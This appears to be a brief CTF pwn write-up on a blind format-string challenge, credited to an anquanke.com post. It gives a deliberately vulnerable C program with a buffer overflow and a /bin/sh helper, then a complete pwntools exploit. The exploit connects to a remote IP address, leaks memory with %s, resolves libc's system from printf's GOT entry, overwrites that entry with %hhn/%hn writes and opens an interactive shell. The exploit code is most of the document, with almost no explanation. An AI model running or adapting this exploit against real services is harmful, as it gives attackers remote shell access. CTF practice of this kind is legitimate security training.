##  formatString

##  Tools

##  Steps

from **https://www.anquanke.com/post/id/85731**

一摸一样没人出 = = 


**source**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln(){
 char buf[64];
 read(STDIN_FILENO,buf,128);
}

void getShell(){
 char *cmd="/bin/sh";
 system(cmd);
}

int main(int argc, char const *argv[])
{
 write(STDOUT_FILENO,"Welcome the Pwn World,follow me!\n",40);
 vuln();
 // getShell();
 return 0;
}
```





```python
from pwn import *
import time
import binascii
context.log_level = 'INFO'
exe = 'blind_pwn_printf'
r = remote('47.98.103.247',9999)
# # dump stack
# for i in range(100):
# payload = '%%%d$p.TMP' % (i)
# r.sendline(payload)
# val = r.recvuntil('.TMP')
# print i*4, val.strip().ljust(10)
# r.recvrepeat(0.2)
def leak(addr):
    payload = "%8$s.TMP" + p32(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    resp = r.recvuntil(".TMP")
    ret = resp[:-4:]
    print "ret:", binascii.hexlify(ret), len(ret)
    remain = r.recvrepeat(0.2)
    return ret
# # failed try
# d = DynELF(leak, 0x8048420)
# # dynamic_ptr = d.dynamic
# system_addr = d.lookup('system', 'libc')
# printf_addr = d.lookup('printf', 'libc')
# # dump .text segmentation
# start_addr = 0x8048420
# # leak(start_addr)
# text_seg = ''
# try:
# while True:
# ret = leak(start_addr)
# text_seg += ret
# start_addr += len(ret)
# if len(ret) == 0:
# start_addr += 1
# text_seg += 'x00'
# except Exception as e:
# print e
# finally:
# print '[+]', len(text_seg)
# with open('dump_bin', 'wb') as fout:
# fout.write(text_seg)
log.success('leaking printf_plt_code')
printf_plt_addr = 0x80483E0
printf_plt_code = leak(printf_plt_addr)
printf_got_plt_addr = u32(printf_plt_code[2:6])
log.success('printf_got_plt_addr: %08x' % (printf_got_plt_addr))
log.success('leaking printf_addr')
printf_addr = u32(leak(printf_got_plt_addr)[:4])
log.success('printf_addr: %08x' % (printf_addr))
libc_addr = printf_addr - 0x00049670
system_addr = libc_addr + 0x0003ada0
log.success('system_addr: %08x' % (system_addr))
log.success('test write...')
byte1 = system_addr & 0xff
byte2 = (system_addr & 0xffff00) >> 8
payload = '%' + str(byte1) + 'c' + '%14$hhn'
payload += '%' + str(byte2 - byte1) + 'c' +'%15$hn'
payload = payload.ljust(32, 'A')
print payload
print len(payload)
payload += p32(printf_got_plt_addr) + p32(printf_got_plt_addr + 1)
r.sendline(payload)
r.interactive()
```

